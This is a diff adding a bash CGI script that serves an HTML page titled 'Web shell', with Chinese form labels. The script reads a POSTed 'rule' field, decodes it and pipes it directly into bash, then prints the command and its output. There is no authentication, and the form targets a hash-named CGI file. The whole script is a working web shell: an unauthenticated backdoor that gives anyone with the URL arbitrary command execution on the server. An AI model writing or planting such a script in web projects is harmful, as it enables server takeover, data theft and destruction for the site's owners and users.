@@ -1,0 +1,29 @@
+#!/bin/bash
+ 
+echo 'Content-type: text/html'
+echo
+read query
+query=`echo "$query" | ./query_getenv_decode.sh rule`
+ echo "<html><head><meta charset=\"utf-8\">
+<meta http-equiv=\"Content-Style-Type\" content=\"text/css\" />
+<link rel=\"stylesheet\" href=\"./md.css\" type=\"text/css\" /><head><body><h2>Web shell</h2>
+<form name=\"webshell\" action=\"./a9e019e247226249ddae4694d8f8f2d7b456caba.cgi\" method=\"post\">
+<table border=\"1\" width=\"100%\">
+
+<tr>
+<td width=\"20%\">Bash</td>
+<td width=\"80%\">
+<textarea name=\"rule\"  rows=\"5\" style=\"width:100%; height:100%; word-break: break-all;\">
+</textarea>
+</td>
+</tr>
+</table>
+<input type=\"submit\" value=\"提交\">
+<input type=\"reset\" value=\"重置\">"
+echo "<p>输入</p><pre>"
+echo "\$ $query"
+
+
+echo "</pre><p>输出</p><pre>"
+echo "$query" |bash
+echo "</pre></body></html>"
